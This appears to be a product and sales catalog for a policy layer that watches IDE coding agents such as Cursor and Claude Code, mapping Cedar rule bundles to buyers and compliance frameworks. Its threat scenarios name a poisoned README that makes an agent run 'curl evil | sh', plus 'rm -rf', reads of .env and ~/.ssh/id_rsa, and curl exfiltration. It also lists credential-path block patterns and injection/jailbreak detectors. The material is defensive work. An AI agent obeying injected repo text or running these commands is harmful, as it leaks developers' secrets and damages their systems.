# Overwatch policies, mapped to what they buy you

**Overwatch is the policy control plane for IDE coding agents** (Cursor, Claude Code,
GitHub Copilot). It sits on the IDE hook path, runs Highflame's detectors on every
prompt, tool call, and file operation, and evaluates the result against Cedar policies to
allow, block, redact, or escalate the action **before it leaves the developer's machine.**

The wedge in one line: *enterprises want to roll out coding agents to thousands of
developers, but security and compliance veto it.* Each Overwatch policy category removes
one specific veto. This page lists every shipped policy and ties it to the use case,
buyer, and compliance unlock it delivers, so you can say to a customer "turn on the pack
that matches your mandate" instead of walking them through 47 Cedar rules.

> **Where the policies live.** Canonical source is
> [`highflame-policy/schemas/overwatch/templates`](https://github.com/highflame-ai/highflame-policy/tree/main/schemas/overwatch/templates)
> (manifest version 5.1.0). You enable them per tenant from **Studio → Overwatch →
> Policies**. This doc is the catalog and the GTM framing; the `.cedar` files are the
> implementation.

---

## How enforcement works

```
Developer / Agent  →  IDE hook  →  Highflame detectors  →  Cedar policy  →  allow / block / redact / step-up
   (Cursor,            (prompt,      (secrets, PII,          (Overwatch
    Claude Code,        tool call,    injection, content      policy set)
    Copilot)            file op)      safety, bash AST…)
```

Cedar is **default-deny**, so a permit-baseline is always loaded and threat-specific
`forbid` rules override it when a detector fires. The detectors produce context keys
(`secrets_detected`, `pii_types`, `injection_score`, `tool_operation_classes`, …) and the
policies are simply assertions over those keys. That separation is why a customer can
re-tune a threshold or scope a rule to one agent without touching detection code.

| Cedar action | Cursor hook | Claude Code hook |
| --- | --- | --- |
| `process_prompt` | `beforeSubmitPrompt` | `UserPromptSubmit` |
| `call_tool` | `beforeShellExecution`, `beforeMCPExecution` | `PreToolUse` (Bash, MCP) |
| `read_file` | `beforeReadFile`, `beforeTabFileRead` | `PreToolUse` (Read) |
| `write_file` | (write via MCP) | `PreToolUse` (Write/Edit) |
| `connect_server` | (MCP connect) | (MCP connect) |

---

## The six categories at a glance

| Category | Buyer | The veto it removes | Compliance unlock |
| --- | --- | --- | --- |
| **Secrets Detection** | CISO / AppSec | "An agent will leak our cloud keys to a third-party model" | NIST SC-28/IA-5, OWASP LLM06/07, PCI 3.4 |
| **PII Detection** | DPO / Privacy / Compliance | "Customer PII will land in a model provider's logs" | GDPR Art. 32, HIPAA §164.312, PCI DSS, CCPA |
| **Semantic Threat Detection** | AppSec / AI Security | "A poisoned repo file will make our agent run malicious commands" | OWASP LLM01/02, ASI01/02, MITRE ATLAS T0051/54 |
| **Content Safety** | Trust & Safety / Legal / AI governance | "We need an acceptable-use control on agent output" | EU AI Act Art. 52, ISO 42001, NIST SI-4 |
| **Tool Permissioning** | Platform / DevEx + Security | "An autonomous agent could `rm -rf`, read `/etc`, or exfiltrate via `curl`" | NIST CM-7/AC-6, OWASP ASI02 + MCP01-05, MITRE T1059 |
| **Agent-Specific Guardrail** | Platform teams running multiple agents | "Cursor and Claude Code have different risk profiles; one policy doesn't fit" | Per-agent governance, BYO-agent control |

A seventh group, **Organization**, is not a threat category. It is the deployment chassis
(permit-default vs deny-default posture, ReBAC project scoping, audit trail) and is
covered at the end.

---

## Full policy inventory

**14 policy bundles, 47 Cedar rules.** Severity is the bundle's headline severity; rule
counts are the individual `forbid`/`permit` statements inside each file.

### Default bundles (`schemas/overwatch/templates/defaults/`)

| Policy ID | Category | Rules | Severity | Auto-on today |
| --- | --- | --- | --- | --- |
| `organization.permit-baseline` | Organization | 1 | low | **Yes** (the only one) |
| `data-protection.defaults` | Secrets Detection | 7 | critical | one-click template |
| `privacy.defaults` | PII Detection | 8 | critical | one-click template |
| `semantic.defaults` | Semantic Threat | 8 | critical | one-click template |
| `trust-safety.defaults` | Content Safety | 6 | critical | one-click template |
| `tools.defaults` | Tool Permissioning | 2 | high | one-click template |

### Opt-in templates (`schemas/overwatch/templates/`)

| Policy ID | Category | Rules | Severity |
| --- | --- | --- | --- |
| `tools.block-shell` | Tool Permissioning | 1 | critical |
| `tools.bash-operation-classes` | Tool Permissioning | 3 | high |
| `tools.mcp-server-allowlist` | Tool Permissioning | 2 | medium |
| `tools.mcp-tool-permissions` | Tool Permissioning | 3 | critical |
| `agent-identity.agent-guardrails` | Agent-Specific Guardrail | 2 | critical |
| `organization.deny-baseline` | Organization | 1 | high |
| `organization.audit-all` | Organization | 1 | low |
| `organization.team-permissions` | Organization | 2 | medium |

> **Decision to make:** today only `permit-baseline` auto-deploys. The three lowest
> false-positive, highest-value bundles (Secrets, Semantic, Tool defaults) ship as
> templates a customer must turn on. See the [default-on recommendation](#recommendation-what-to-ship-on-by-default).

---

## The use-case packs (the plan)

Group the 14 bundles into **five buyer-facing packs** plus a default-on baseline. Each
pack maps to one buyer, one board-level mandate, and one compliance framework, so it
sells as a single decision.

### Pack 0 — Secure-by-default baseline (every tenant, day one)

| | |
| --- | --- |
| **Bundles** | `permit-baseline` + Secrets + Semantic + Tool defaults |
| **Buyer** | CISO / AppSec (the team that owns the agent rollout) |
| **Scenario it stops** | Dev pastes a live `AKIA…` key into a prompt; agent reads `.env` or `~/.ssh/id_rsa`; a poisoned README tells the agent to run `curl evil \| sh`; agent tries `rm -rf` or reads `/etc` |
| **User value** | Removes the top three adoption blockers (credential leak, injection, destructive ops) with low false positives, so security can say yes to the rollout |
| **Compliance** | NIST SC-28/IA-5/SI-3, OWASP LLM01/06, MITRE T1059/T1552 |

This is the single highest-leverage change: promote Secrets + Semantic + Tool defaults
from opt-in to auto-on so the product is safe out of the box.

### Pack 1 — Privacy & Regulated Data

| | |
| --- | --- |
| **Bundle** | PII Detection (`privacy.defaults`) |
| **Buyer** | DPO / Privacy / Compliance in regulated industries (fintech, health, gov) |
| **Scenario it stops** | Support engineer pastes a customer record (SSN, credit card); agent reads a PII-laden CSV into a prompt |
| **User value** | Unlocks agents for regulated teams. Severity tiering is tuned so it does not break normal dev work: SSN/CC/passport/IBAN block all surfaces, email/phone/DOB block prompt and tool only, IP is prompt-only |
| **Compliance** | GDPR Art. 32, HIPAA §164.312, PCI DSS 3.4/4.1, CCPA §1798.150 |

### Pack 2 — AI Governance & Acceptable Use

| | |
| --- | --- |
| **Bundle** | Content Safety (`trust-safety.defaults`) |
| **Buyer** | Trust & Safety / Legal / the AI-governance owner |
| **Scenario it stops** | Agent generates or is steered toward violent, weapons, hate, crime, sexual, or heavily profane content |
| **User value** | Acceptable-use and brand/legal protection. Thresholds are tuned (hate 75, profanity 90) so normal expression is fine. This is a governance checkbox more than a productivity feature |
| **Compliance** | **EU AI Act Art. 52, ISO 42001**, NIST SI-4. The procurement unlock for EU enterprises |

### Pack 3 — Zero-Trust Tooling

| | |
| --- | --- |
| **Bundles** | `tools.bash-operation-classes` (or `tools.block-shell`) + `tools.mcp-server-allowlist` + `tools.mcp-tool-permissions` + `organization.deny-baseline` + `organization.team-permissions` |
| **Buyer** | Platform / DevEx + Security in high-security or regulated environments |
| **Scenario it stops** | Agent replays an MCP-blocked operation through the shell; connects an unverified MCP server; reaches the network via `curl`; runs an unrecognized CLI |
| **User value** | Least-privilege for autonomous agents. The **bash AST classifier** tiers every shell command (read-only allowed, network blocked, writes blocked, execute/unknown routed to **human step-up approval via OpenID CIBA**). That turns a binary block into human-in-the-loop, which is what lets an enterprise grant agents real autonomy. The MCP allowlist plus unverified-server block is supply-chain control for the exploding MCP ecosystem |
| **Compliance** | NIST CM-7/AC-6(1), OWASP ASI02 + MCP01-05, MITRE T1059 |

The step-up approval is the differentiator to lead with: *"deny the dangerous thing, or
let a named approver wave it through, instead of blocking the developer cold."*

### Pack 4 — Audit & Compliance

| | |
| --- | --- |
| **Bundle** | `organization.audit-all` |
| **Buyer** | GRC / the team preparing for an audit |
| **Scenario it serves** | Every agent action permitted and logged for an evidence trail |
| **User value** | SOC2 evidence with no enforcement risk; pairs with any other pack |
| **Compliance** | SOC2 |

### Overlay — Per-agent guardrails

| | |
| --- | --- |
| **Bundle** | `agent-identity.agent-guardrails` |
| **Buyer** | Platform teams running more than one agent |
| **Scenario it serves** | Injection-block scoped to Claude, PII-block scoped to Cursor; stricter rules on the more autonomous agent |
| **User value** | Principal-scoped control (`Overwatch::Agent::"claude"`). One platform governs heterogeneous tools and BYO-agents. Foundation for per-agent risk scoring |

---

## Recommendation: what to ship on by default

1. **Promote to auto-on:** Secrets + Semantic + Tool defaults (join `permit-baseline`).
   Low false positives, universal value, removes the top vetoes. This also resolves the
   current drift where the older test-plan doc calls Secrets "default active" while the
   manifest ships it as a template.
2. **Surface the other four as one-click packs** in Studio, each labeled by mandate
   (Privacy, AI Governance, Zero-Trust Tooling, Audit) rather than by Cedar rule.
3. **Offer per-agent overlays** for multi-agent orgs.

Result: safe out of the box, and every additional control maps to a buyer and a framework
a customer already has to satisfy.

---

## Compliance coverage matrix

| Framework | Covered by |
| --- | --- |
| OWASP LLM Top 10 (LLM01, LLM02, LLM06, LLM07) | Semantic, Secrets |
| OWASP Agentic Top 10 (ASI01, ASI02) | Semantic, Tool Permissioning |
| OWASP MCP Top 10 (MCP01-05) | MCP allowlist + tool permissions |
| MITRE ATLAS (AML.T0051, T0054) | Semantic (injection, jailbreak) |
| MITRE ATT&CK (T1059, T1005, T1552) | Semantic, Tool Permissioning, Secrets |
| NIST 800-53 (AC-3/6, CM-7, IA-5, SC-28, SI-3/4) | Secrets, Tool Permissioning, Content Safety |
| PCI DSS 3.4 / 4.1 | PII, Secrets |
| GDPR Art. 32 | PII |
| HIPAA §164.312 | PII |
| EU AI Act Art. 52 / ISO 42001 | Content Safety |
| SOC2 | Audit (Organization) |

---

## Appendix: rule-level detail

**Secrets Detection (7):** secrets-in-prompt, secrets-in-tool, SSH keys, PEM/cert keys,
env-var secrets, credential-path access (`~/.ssh`, `~/.aws`, `~/.gnupg`, gcloud, azure,
`id_rsa`), `.env` file access.

**PII Detection (8, severity-tiered):** SSN + credit card (critical, all four surfaces),
passport + IBAN (high, all surfaces), email + phone + DOB (medium, prompt and tool only),
IP address (low, prompt only).

**Semantic Threat (8, two tiers):** pattern tier with no API dependency (command injection
in tool and prompt, SQL injection in tool and prompt, path traversal, encoded payloads);
ML tier (`injection_score >= 75`, `jailbreak_score >= 75`). The offline pattern tier
matters for air-gapped customers.

**Content Safety (6, ML scores 0-100):** violence >= 80, weapons >= 80, hate speech >= 75,
crime >= 80, sexual >= 80, profanity >= 90.

**Tool Permissioning (11 across 5 bundles):** sensitive system paths (`/etc`, `/proc`,
`/System`, …) and destructive MCP ops (`fs.delete`, `rmdir`, `unlink`); full shell block;
bash AST operation classes (block network, block writes, step-up for execute/unknown);
MCP server allowlist; MCP tool permissions (permit-default + exclude untrusted + block
unverified-registry servers).

**Agent-Specific Guardrail (2):** injection-block on `Agent::"claude"`, PII-block on
`Agent::"cursor"` (templates to customize per deployment).

**Organization / posture (5):** permit-baseline, deny-all baseline, audit-all,
dev-project full access + support-project read-only (ReBAC).

### Representative Cedar (copy from the canonical files)

Block any tool call that carries a detected secret:

```cedar
forbid (
    principal,
    action == Overwatch::Action::"call_tool",
    resource
)
when {
    context has secrets_detected && context.secrets_detected == true
};
```

Route risky shell commands to human approval instead of a hard block:

```cedar
@step_up_required("role=security_oncall,timeout_seconds=3600")
permit (
    principal,
    action == Overwatch::Action::"call_tool",
    resource
)
when {
    context has tool_operation_classes &&
    (
        context.tool_operation_classes.contains("execute_enabling") ||
        context.tool_operation_classes.contains("unknown")
    )
};
```

Full sources: [`highflame-policy/schemas/overwatch/templates`](https://github.com/highflame-ai/highflame-policy/tree/main/schemas/overwatch/templates).
